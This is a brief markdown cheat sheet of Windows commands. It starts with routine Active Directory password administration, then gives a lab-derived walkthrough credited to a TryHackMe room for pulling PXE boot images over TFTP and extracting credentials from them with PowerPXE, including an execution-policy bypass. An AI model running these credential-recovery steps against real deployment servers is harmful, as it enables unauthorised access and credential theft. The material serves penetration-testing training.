# Windows Commands

* [Active Directory](#active-directory)
* [Microsoft Deployment Toolkit](#microsoft-deployment-toolkit)


## Active Directory
Set password:
```
Set-ADAccountPassword [USERNAME] -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```
Force password reset on next login:
```
Set-ADUser -ChangePasswordAtLogon $true -Identity [USERNAME] -Verbose
```
Force group policy update:
```
gpupdate /force
```
************************************
## Microsoft Deployment Toolkit

Dowload BDC file via TFTP:
```
tftp -i [TARGET-IP] GET "\Tmp\[FILE-PATH]" conf.bcd
```

Recover the locations of the PXE boot images from the BCD file:
```
powershell -executionpolicy bypass
```
```
Import-Module .\PowerPXE.ps1
```
```
$BCDFile = "conf.bcd"
```
```
Get-WimFile -bcdFile $BCDFile
```
Download Image:
```
tftp -i [TARGET-IP] GET "[PXE-BOOT-IMAGE-LOCATION]" pxeboot.wim
```
Recovering Credentials from a PXE Boot Image:
```
Get-FindCredentials -WimFile pxeboot.wim
```

* Credit: https://tryhackme.com/room/breachingad

************************************

## References
* https://tryhackme.com/room/breachingad
